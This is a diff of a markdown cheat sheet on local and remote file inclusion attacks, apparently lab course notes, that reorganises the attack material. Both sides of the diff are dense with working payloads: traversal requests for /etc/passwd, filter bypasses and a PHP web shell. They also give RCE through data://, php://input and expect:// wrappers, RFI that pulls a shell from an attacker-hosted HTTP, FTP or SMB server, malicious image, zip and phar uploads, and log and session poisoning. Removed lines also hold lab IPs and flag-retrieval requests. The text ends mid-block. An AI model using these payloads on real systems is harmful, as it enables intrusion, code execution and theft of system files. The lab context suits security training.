@@ -1,42 +1,6 @@
 # Intro to File Inclusions 
 
-**PHP FILE INCLUSION FUNCTIONS**
-
-```
-include()
-include_once()
-require()
-require_once()
-file_get_contents()
-fopen()
-file()
-```
-
-**NODEJS FILE ACCESS FUNCTIONS**
-
-```
-fs.readFile()
-fs.sendFile()
-res.render()
-```
-
-**JAVA FILE INCLUSION FUNCTIONS**
-
-```
-include
-import
-```
-
-**.NET FILE INCLUSION FUNCTIONS**
-
-```
-@Html.Partial()
-@Html.RemotePartial()
-Response.WriteFile()
-include
-```
-
-**PHP VULNERABLE CODE SNIPPET**
+**PHP Vulnerable Functions**
 
 ```php
 if (isset($_GET['language'])) {
@@ -44,25 +8,23 @@ if (isset($_GET['language'])) {
 }
 ```
 
-**NODEJS VULNERABLE CODE SNIPPET**
+**NodeJS Vulnerable Functions**
 
 ```javascript
 if(req.query.language) {
     fs.readFile(path.join(__dirname, req.query.language), function (err, data) {
-        res.write(data);
-    });
+       res.write(data);
+   });
 }
 ```
 
-**NODEJS EXPRESS RENDER SNIPPET**
-
-```javascript
+```js
 app.get("/about/:language", function(req, res) {
     res.render(`/${req.params.language}/about.html`);
 });
 ```
 
-**JAVA JSP INCLUDE SNIPPET**
+**Java Vulnerable Functions**
 
 ```jsp
 <c:if test="${not empty param.language}">
@@ -70,232 +32,133 @@ app.get("/about/:language", function(req, res) {
 </c:if>
 ```
 
-**JAVA JSP IMPORT SNIPPET**
-
 ```jsp
 <c:import url= "<%= request.getParameter('language') %>"/>
 ```
 
-**.NET RESPONSE WRITEFILE SNIPPET**
+**.NET Vulnerable Functions**
 
 ```cs
 @if (!string.IsNullOrEmpty(HttpContext.Request.Query['language'])) {
-    <% Response.WriteFile("<% HttpContext.Request.Query['language'] %>"); %> 
+    <% Response.WriteFile("<% HttpContext.Request.Query['language'] %>"); %>
 }
 ```
-
-**.NET HTML PARTIAL SNIPPET**
 
 ```cs
 @Html.Partial(HttpContext.Request.Query['language'])
 ```
 
-**.NET INCLUDE DIRECTIVE**
-
 ```cs
 <!--#include file="<% HttpContext.Request.Query['language'] %>"-->
 ```
 
-**EXAMPLE HTTP PARAMETERS**
+**URL Parameter Patterns**
 
-```
+```http
 /index.php?page=about
+```
+
+```http
 ?language=es
+```
+
+```http
 /about/en
+```
+
+```http
 /about/es
 ```
 
-| **Function**                 | **Read Content** | **Execute** | **Remote URL** |
-| ---------------------------- | :--------------: | :---------: | :------------: |
-| **PHP**                      |                  |             |                |
-| `include()`/`include_once()` |        ✅         |      ✅      |       ✅        |
-| `require()`/`require_once()` |        ✅         |      ✅      |       ❌        |
-| `file_get_contents()`        |        ✅         |      ❌      |       ✅        |
-| `fopen()`/`file()`           |        ✅         |      ❌      |       ❌        |
-| **NodeJS**                   |                  |             |                |
-| `fs.readFile()`              |        ✅         |      ❌      |       ❌        |
-| `fs.sendFile()`              |        ✅         |      ❌      |       ❌        |
-| `res.render()`               |        ✅         |      ✅      |       ❌        |
-| **Java**                     |                  |             |                |
-| `include`                    |        ✅         |      ❌      |       ❌        |
-| `import`                     |        ✅         |      ✅      |       ✅        |
-| **.NET**                     |                  |             |                |
-| `@Html.Partial()`            |        ✅         |      ❌      |       ❌        |
-| `@Html.RemotePartial()`      |        ✅         |      ❌      |       ✅        |
-| `Response.WriteFile()`       |        ✅         |      ❌      |       ❌        |
-| `include`                    |        ✅         |      ✅      |       ✅        |
 
 
-# LFI Attacker Workflow (added)
-
-**COMMON LFI PARAMETERS**
-
-```text
-?page=
-?file=
-?path=
-?template=
-?view=
-?include=
-?language=
-?lang=
-?doc=
-?folder=
-?root=
-```
-
-**COMMON LFI ENDPOINT PATTERNS**
-
-```text
-/index.php?page=
-/index.php?file=
-/index.php?language=
-/index.php?view=
-/index.php?template=
-/index.php?include=
-/index.php?path=
-```
-
-**COMMON PATH TRAVERSAL PAYLOADS**
-
-```text
-../
-../../
-../../../
-../../../../
-../../../../../
-../../../../../../
-```
-
-**LINUX SENSITIVE FILE TARGETS**
-
-```text
-/etc/passwd
-/etc/shadow
-/etc/hosts
-/etc/hostname
-/proc/self/environ
-/proc/version
-/proc/self/cmdline
-```
-
-**WINDOWS SENSITIVE FILE TARGETS**
-
-```text
-C:\Windows\win.ini
-C:\Windows\System32\drivers\etc\hosts
-```
-
-**COMMON LFI TEST REQUESTS**
-
-```text
-/index.php?page=../../../../etc/passwd
-/index.php?file=../../../../etc/passwd
-/index.php?language=../../../../etc/passwd
-/index.php?view=../../../../etc/passwd
-/index.php?template=../../../../etc/passwd
-```
-
----
 
 # Local File Inclusion (LFI) 
 
-**TARGET URLS**
+**Basic LFI - Absolute Path**
 
-```text
-http://<SERVER_IP>:<PORT>/
-http://<SERVER_IP>:<PORT>/index.php?language=es.php
+```http
 http://<SERVER_IP>:<PORT>/index.php?language=/etc/passwd
+```
+
+```http
+http://<SERVER_IP>:<PORT>/index.php?language=C:\Windows\boot.ini
+```
+
+**Path Traversal**
+
+```http
 http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/passwd
-http://<SERVER_IP>:<PORT>/index.php?language=../../../etc/passwd
+```
+
+**Filename Prefix Bypass**
+
+```http
 http://<SERVER_IP>:<PORT>/index.php?language=/../../../etc/passwd
-http://<SERVER_IP>:<PORT>/extension/index.php?language=/etc/passwd
 ```
 
-**PARAMETERS**
-
-```text
-language
-```
-
-**FILES AND PATHS**
-
-```text
-/etc/passwd
-C:\Windows\boot.ini
-./languages/
-../index.php
-../../../../etc/passwd
-../../../etc/passwd
-/../../../etc/passwd
-/var/www/html/languages/
-/var/www/html/index.php
-/
-index.php
-/profile/$username/avatar.png
-/usr/share/flags/flag.txt
-```
-
-**PHP VULNERABLE CODE**
+**Vulnerable PHP Code Patterns**
 
 ```php
 include($_GET['language']);
 ```
 
-**PHP DIRECTORY APPEND CODE**
-
 ```php
 include("./languages/" . $_GET['language']);
 ```
-
-**PHP PREFIX APPEND CODE**
 
 ```php
 include("lang_" . $_GET['language']);
 ```
 
-**PHP EXTENSION APPEND CODE**
-
 ```php
 include($_GET['language'] . ".php");
 ```
 
-**PATH TRAVERSAL PAYLOADS**
+**Second-Order Attack - Malicious Username Payload**
 
 ```text
-../
-../../../
-../../../../
-/../../../etc/passwd
-../../../../etc/passwd
 ../../../etc/passwd
 ```
 
-**SECOND-ORDER LFI PAYLOADS**
+**Second-Order Attack - Affected Endpoint Pattern**
 
-```text
-../../../etc/passwd
+```http
 /profile/$username/avatar.png
 ```
 
-**QUESTION TARGETS**
 
-```text
-154.57.164.75:30791
-/usr/share/flags
-flag.txt
-```
-
-```
-http://154.57.164.75:30791/index.php?language=../../../../../../usr/share/flags/flag.txt
-```
 # Basic Bypasses 
 
-**PHP FILTER SNIPPETS**
+**Non-Recursive Filter Bypass**
+
+```http
+http://<SERVER_IP>:<PORT>/index.php?language=....//....//....//....//etc/passwd
+```
+
+```text
+..././
+....\/
+....////
+```
+
+**Vulnerable PHP Filter Code**
 
 ```php
 $language = str_replace('../', '', $_GET['language']);
 ```
+
+**URL Encoding Bypass**
+
+```http
+<SERVER_IP>:<PORT>/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
+```
+
+```text
+../  →  %2e%2e%2f
+```
+
+**Approved Path Bypass**
 
 ```php
 if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
@@ -305,432 +168,251 @@ if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
 }
 ```
 
-**LFI TEST URLS**
-
-```text
-http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/passwd
-http://<SERVER_IP>:<PORT>/index.php?language=....//....//....//....//etc/passwd
-<SERVER_IP>:<PORT>/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
+```http
 <SERVER_IP>:<PORT>/index.php?language=./languages/../../../../etc/passwd
 ```
 
-**RECURSIVE TRAVERSAL PAYLOADS**
+**Path Truncation (PHP < 5.3/5.4)**
 
 ```text
-....//
-..././
-....\/
-....////
-```
-
-**URL-ENCODED PAYLOADS**
-
-```text
-%2e%2e%2f
-%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
-```
-
-**APPROVED PATH PAYLOADS**
-
-```text
-./languages/../../../../etc/passwd
-```
-
-**PATH TRUNCATION PAYLOAD**
-
-```url
 ?language=non_existing_directory/../../../etc/passwd/./././././ REPEATED ~2048 times]
 ```
 
-**PATH TRUNCATION GENERATION COMMAND**
-
-```shellsession
+```bash
 echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
 ```
 
-**NULL BYTE PAYLOAD**
+**Null Byte Injection (PHP < 5.5)**
 
 ```text
 /etc/passwd%00
+```
+
+```http
 /etc/passwd%00.php
 ```
 
-**FILES AND PATHS**
+---
 
-```text
-/etc/passwd
-/flag.txt
-./languages/
-.php
-/etc/passwd/.
-/etc/passwd
-////etc/passwd
-/etc/./passwd
-```
+---
 
-**TOOLS**
-
-```text
-Burp Suite Decoder
-online URL encoder utility
-```
 
 
 # PHP Filters 
 
-**FUZZING FOR PHP FILES**
+**Fuzzing for PHP Files**
 
-```shellsession
+```bash
 ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
 ```
 
-```
-ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://154.57.164.74:30195/FUZZ.php
-```
-**STANDARD LFI REQUEST**
-
-```text
-http://<SERVER_IP>:<PORT>/index.php?language=config
-```
-
-**PHP FILTER PAYLOAD**
+**PHP Filter Wrapper - Base64 Source Disclosure**
 
 ```text
 php://filter/read=convert.base64-encode/resource=config
 ```
 
-**PHP FILTER LFI REQUEST**
-
-```text
+```http
 http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=config
 ```
 
-**BASE64 DECODE COMMAND**
+**Decode Base64 Output**
 
-```shellsession
+```bash
 echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d
 ```
 
-**PHP WRAPPER SCHEME**
+**Standard PHP Inclusion (no filter)**
 
-```text
-php://filter/
+```http
+http://<SERVER_IP>:<PORT>/index.php?language=config
 ```
 
-**FILTER PARAMETERS**
+---
 
-```text
-read
-resource
-```
+---
 
-**FILTER TYPE USED**
 
-```text
-convert.base64-encode
-```
-
-**FILES**
-
-```text
-index.php
-config.php
-```
-
-**WORDLIST**
-
-```text
-/opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
-```
 # PHP Wrappers 
 
-**PHP CONFIGURATION FILE PATHS**
+**Read PHP Configuration - Apache**
 
-```text
-/etc/php/X.Y/apache2/php.ini
-/etc/php/X.Y/fpm/php.ini
-/etc/php/7.4/apache2/php.ini
-```
-
-**PHP FILTER PAYLOAD**
-
-```text
-php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini
-```
-
-**CURL REQUEST TO READ PHP.INI**
-
-```shellsession
+```bash
 curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
 ```
 
-**BASE64 DECODE AND GREP**
+**Read PHP Configuration - Nginx**
 
-```shellsession
+```text
+/etc/php/X.Y/fpm/php.ini
+```
+
+**Check allow_url_include**
+
+```bash
 echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
 ```
 
-**PHP WEB SHELL**
+**Check expect Extension**
+
+```bash
+echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
+```
+
+**data Wrapper - Encode Web Shell**
+
+```bash
+echo '<?php system($_GET["cmd"]); ?>' | base64
+```
+
+**data Wrapper - RCE via Browser**
+
+```http
+http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
+```
+
+**data Wrapper - RCE via curl**
+
+```bash
+curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
+```
+
+**input Wrapper - RCE via POST**
+
+```bash
+curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
+```
+
+**expect Wrapper - RCE**
+
+```bash
+curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id" | grep uid
+```
+
+**Web Shell Payload**
 
 ```php
 <?php system($_GET["cmd"]); ?>
 ```
 
-**BASE64 ENCODE COMMAND**
-
-```shellsession
-echo '<?php system($_GET["cmd"]); ?>' | base64
-```
-
-**BASE64-ENCODED WEB SHELL**
+**Base64 Encoded Web Shell**
 
 ```text
 PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
 ```
 
-**DATA WRAPPER PAYLOAD**
-
-```text
-data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D
-```
-
-**DATA WRAPPER REQUEST**
-
-```text
-http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
-```
-
-**DATA WRAPPER CURL REQUEST**
-
-```shellsession
-curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
-```
-
-**INPUT WRAPPER REQUEST**
-
-```shellsession
-curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
-```
-
-**INPUT WRAPPER**
-
-```text
-php://input
-```
-
-**STATIC PHP COMMAND EXAMPLE**
-
-```php
-<?php system('id')?>
-```
-
-**EXPECT CHECK**
-
-```shellsession
-echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
-```
-
-**EXPECT WRAPPER REQUEST**
-
-```shellsession
-curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id" | grep uid
-```
-
-**EXPECT WRAPPER**
-
-```text
-expect://id
-```
-
-**PARAMETERS**
-
-```text
-language
-cmd
-allow_url_include
-expect
-resource
-read
-```
-
-**FILES AND PATHS**
-
-```text
-/
-```
-
-**TOOLS**
-
-```text
-curl
-Burp
-base64
-grep
-```
-
-```
-data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=ls%20/
-```
-
-```
-data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=cat%20/37809e2f8952f06139011994726d9ef1.txt
-```
-
 # Remote File Inclusion (RFI) 
 
-**RFI-CAPABLE FUNCTIONS**
+**Verify RFI - Local URL Test**
 
-```text
-include()
-include_once()
-file_get_contents()
-import
-@Html.RemotePartial()
-include
-```
-
-**VERIFY RFI**
-
-```shellsession
-echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
-```
-
-```text
+```http
 http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php
 ```
 
-**WEB SHELL**
+**Check allow_url_include**
 
-```shellsession
+```bash
+echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
+```
+
+**Create Web Shell**
+
+```bash
 echo '<?php system($_GET["cmd"]); ?>' > shell.php
 ```
+
+**HTTP - Start Python Server**
+
+```bash
+sudo python3 -m http.server <LISTENING_PORT>
+```
+
+**HTTP - RFI Execution**
+
+```http
+http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
+```
+
+**FTP - Start FTP Server**
+
+```bash
+sudo python -m pyftpdlib -p 21
+```
+
+**FTP - RFI Execution**
+
+```http
+http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id
+```
+
+**FTP - RFI with Credentials**
+
+```bash
+curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
+```
+
+**SMB - Start SMB Server**
+
+```bash
+impacket-smbserver -smb2support share $(pwd)
+```
+
+**SMB - RFI Execution**
+
+```http
+http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
+```
+
+**Web Shell Payload**
 
 ```php
 <?php system($_GET["cmd"]); ?>
 ```
 
-**HTTP**
+---
 
-```shellsession
-sudo python3 -m http.server <LISTENING_PORT>
-```
+---
 
-```text
-http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
-```
-
-**FTP**
-
-```shellsession
-sudo python -m pyftpdlib -p 21
-```
-
-```text
-http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id
-```
-
-```shellsession
-curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
-```
-
-**SMB**
-
-```shellsession
-impacket-smbserver -smb2support share $(pwd)
-```
-
-```text
-http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
-```
-
-**PATHS AND PARAMETERS**
-
-```text
-http://127.0.0.1:80/index.php
-shell.php
-\\<OUR_IP>\share\shell.php
-language
-cmd
-/
-```
-
-**TOOLS AND SERVICES**
-
-```text
-curl
-base64
-grep
-python3 -m http.server
-pyftpdlib
-impacket-smbserver
-HTTP
-FTP
-SMB
-```
-
-```
-http://10.129.29.114/index.php?language=http://10.10.14.134:8000/shell.php&cmd=ls%20/
-```
-
-```
-http://10.129.29.114/index.php?language=http://10.10.14.134:8000/shell.php&cmd=cat%20/exercise/flag.txt
-```
 
 # LFI and File Uploads 
 
-**PHP EXECUTION-CAPABLE FUNCTIONS**
+**Image Upload - Craft Malicious GIF**
 
-```text
-include()
-include_once()
-require()
-require_once()
-res.render()
-import
-include
-```
-
-**MALICIOUS IMAGE WEB SHELL**
-
-```shellsession
+```bash
 echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
 ```
 
-```php
-GIF8<?php system($_GET["cmd"]); ?>
+**Image Upload - Upload Path**
+
+```http
+http://<SERVER_IP>:<PORT>/settings.php
 ```
 
-**UPLOADED FILE PATH**
-
-```text
-/profile_images/shell.gif
-```
-
-**HTML IMAGE REFERENCE**
+**Image Upload - HTML Source Path**
 
 ```html
 <img src="/profile_images/shell.gif" class="profile-image" id="profile-image">
 ```
 
-**LFI EXECUTION REQUEST**
+**Image Upload - LFI Execution**
 
-```text
+```http
 http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id
 ```
 
-**ZIP WRAPPER PAYLOAD CREATION**
+**Zip Upload - Create Zipped Shell**
 
-```shellsession
+```bash
 echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
 ```
 
-**ZIP WRAPPER REQUEST**
+**Zip Upload - LFI Execution**
 
-```text
+```http
 http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
 ```
 
-**PHAR PAYLOAD SCRIPT**
+**Phar Upload - shell.php Script**
 
 ```php
 <?php
@@ -738,219 +420,104 @@ $phar = new Phar('shell.phar');
 $phar->startBuffering();
 $phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
 $phar->setStub('<?php __HALT_COMPILER(); ?>');
-
 $phar->stopBuffering();
 ```
 
-**PHAR BUILD COMMAND**
+**Phar Upload - Compile and Rename**
 
-```shellsession
+```bash
 php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
 ```
 
-**PHAR WRAPPER REQUEST**
+**Phar Upload - LFI Execution**
 
-```text
+```http
 http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
 ```
 
-**FILES AND PATHS**
+**Web Shell Payload**
 
-```text
-shell.gif
-shell.php
-shell.jpg
-shell.phar
-shell.txt
-/profile_images/
-/
+```php
+<?php system($_GET["cmd"]); ?>
 ```
 
-**PARAMETERS**
+---
 
-```text
-language
-cmd
-```
+---
 
-**TOOLS**
-
-```text
-zip
-php
-```
-
-```
-http://154.57.164.66:31714/index.php?language=./profile_images/shell.gif&cmd=cat%20/2f40d853e2d4768d87da1c81772bae0a.txt
-```
 
 # Log Poisoning 
 
-**EXECUTION-CAPABLE FUNCTIONS**
+**PHP Session Poisoning - Include Session File**
 
-```text
-include()
-include_once()
-require()
-require_once()
-res.render()
-import
-include
-```
-
-**SESSION FILE PATHS**
-
-```text
-/var/lib/php/sessions/
-C:\Windows\Temp\
-```
-
-**SESSION FILE FORMAT**
-
-```text
-/var/lib/php/sessions/sess_<PHPSESSID>
-```
-
-**SESSION FILE EXAMPLE**
-
-```text
-/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
-```
-
-**READ SESSION FILE**
-
-```text
+```http
 http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
 ```
 
-**CONTROL SESSION VALUE**
+**PHP Session Poisoning - Session File Paths**
 
 ```text
+/var/lib/php/sessions/sess_<PHPSESSID>
+C:\Windows\Temp\sess_<PHPSESSID>
+```
+
+**PHP Session Poisoning - Test Control of page Value**
+
+```http
 http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning
 ```
 
-**URL-ENCODED PHP WEB SHELL**
+**PHP Session Poisoning - Write Web Shell to Session**
 
-```text
-%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
-```
-
-**SESSION POISONING PAYLOAD**
-
-```text
+```http
 http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
 ```
 
-**EXECUTE COMMAND THROUGH SESSION FILE**
+**PHP Session Poisoning - Execute Command**
 
-```text
+```http
 http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
 ```
 
-**APACHE LOG PATHS**
+**Server Log Poisoning - Include Apache Log**
+
+```http
+http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log
+```
+
+**Server Log Poisoning - Apache/Nginx Log Paths**
 
 ```text
 /var/log/apache2/access.log
 /var/log/apache2/error.log
 C:\xampp\apache\logs\
-```
-
-**NGINX LOG PATHS**
-
-```text
 /var/log/nginx/access.log
 /var/log/nginx/error.log
 C:\nginx\log\
 ```
 
-**READ SERVER LOG**
+**Server Log Poisoning - Poison via curl**
 
-```text
-http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log
-```
-
-**USER-AGENT WEB SHELL**
-
-```php
-<?php system($_GET['cmd']); ?>
-```
-
-**USER-AGENT HEADER FILE**
-
-```shellsession
+```bash
 echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
-```
-
-**POISON LOG WITH CURL**
-
-```shellsession
 curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison
 ```
 
-**EXECUTE COMMAND THROUGH LOG**
+**Server Log Poisoning - Execute Command via Poisoned Log**
 
-```text
+```http
 http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log&cmd=id
 ```
 
-**PROC FILE TARGETS**
+**Proc File Paths for User-Agent Poisoning**
 
 ```text
 /proc/self/environ
 /proc/self/fd/0
 /proc/self/fd/1
-/proc/self/fd/2
-/proc/self/fd/3
-/proc/self/fd/4
-/proc/self/fd/5
-/proc/self/fd/6
-/proc/self/fd/7
-/proc/self/fd/8
-/proc/self/fd/9
-/proc/self/fd/10
-/proc/self/fd/11
-/proc/self/fd/12
-/proc/self/fd/13
-/proc/self/fd/14
-/proc/self/fd/15
-/proc/self/fd/16
-/proc/self/fd/17
-/proc/self/fd/18
-/proc/self/fd/19
-/proc/self/fd/20
-/proc/self/fd/21
-/proc/self/fd/22
-/proc/self/fd/23
-/proc/self/fd/24
-/proc/self/fd/25
-/proc/self/fd/26
-/proc/self/fd/27
-/proc/self/fd/28
-/proc/self/fd/29
-/proc/self/fd/30
-/proc/self/fd/31
-/proc/self/fd/32
-/proc/self/fd/33
-/proc/self/fd/34
-/proc/self/fd/35
-/proc/self/fd/36
-/proc/self/fd/37
-/proc/self/fd/38
-/proc/self/fd/39
-/proc/self/fd/40
-/proc/self/fd/41
-/proc/self/fd/42
-/proc/self/fd/43
-/proc/self/fd/44
-/proc/self/fd/45
-/proc/self/fd/46
-/proc/self/fd/47
-/proc/self/fd/48
-/proc/self/fd/49
-/proc/self/fd/50
 ```
 
-**OTHER LOG TARGETS**
+**Other Poisonable Log Files**
 
 ```text
 /var/log/sshd.log
@@ -958,158 +525,246 @@ http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log&cmd=id
 /var/log/vsftpd.log
 ```
 
-**PARAMETERS**
+**Web Shell Payload (URL Encoded)**
 
 ```text
-language
-cmd
-PHPSESSID
+%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
 ```
 
-**TOOLS**
+**Web Shell Payload (Plain)**
 
-```text
-curl
-Burp Suite
+```php
+<?php system($_GET["cmd"]); ?>
 ```
 
-```
-curl -s "http://154.57.164.66:31322/index.php" -H @Poison
-```
-# Automated Scanning
+---
 
-**FUZZ PARAMETERS**
+---
 
-```shellsession
+
+# Automated Scanning 
+
+
+**Fuzz for Exposed GET Parameters**
+
+```bash
 ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
 ```
 
-**PARAMETER DISCOVERY RESULT**
+**Fuzz LFI Payloads Against Parameter**
 
-```text
-language
-```
-
-**LFI WORDLIST FUZZING**
-
-```shellsession
+```bash
 ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
 ```
 
-**COMMON LFI PAYLOAD RESULTS**
+**Fuzz Server Webroot - Linux**
 
-```text
-..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd
-../../../../../../../../../../../../etc/hosts
-../../../../etc/passwd
-../../../../../etc/passwd
-../../../../../../etc/passwd&=%3C%3C%3C%3C
-..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
-/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+```bash
+ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
 ```
 
-**WORDLISTS**
+**Fuzz Server Logs and Configs - Linux Wordlist**
+
+```bash
+ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
+```
+
+**Read Apache Config**
+
+```bash
+curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/apache2.conf
+```
+
+**Read Apache Envvars**
+
+```bash
+curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/envvars
+```
+
+**Wordlist Paths**
 
 ```text
 /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt
 /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
 /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt
-/usr/share/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt
 ./LFI-WordList-Linux
 ```
 
-**FUZZ WEBROOT PATH**
-
-```shellsession
-ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
-```
-
-**WEBROOT RESULT**
+**Key Config and Log File Paths**
 
 ```text
-/var/www/html/
-```
-
-**FUZZ SERVER FILES**
-
-```shellsession
-ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
-```
-
-**DISCOVERED FILES**
-
-```text
+/etc/apache2/apache2.conf
+/etc/apache2/envvars
+/var/log/apache2/access.log
+/var/log/apache2/error.log
 /etc/hosts
 /etc/hostname
-/etc/login.defs
 /etc/fstab
-/etc/apache2/apache2.conf
-/etc/issue.net
-/etc/apache2/mods-enabled/status.conf
-/etc/apache2/mods-enabled/alias.conf
-/etc/apache2/envvars
-/etc/adduser.conf
 ```
 
-**READ APACHE CONFIG**
-
-```shellsession
-curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/apache2.conf
-```
-
-**READ APACHE ENV VARIABLES**
-
-```shellsession
-curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/envvars
-```
-
-**SERVER CONFIG VALUES**
+**LFI Tools**
 
 ```text
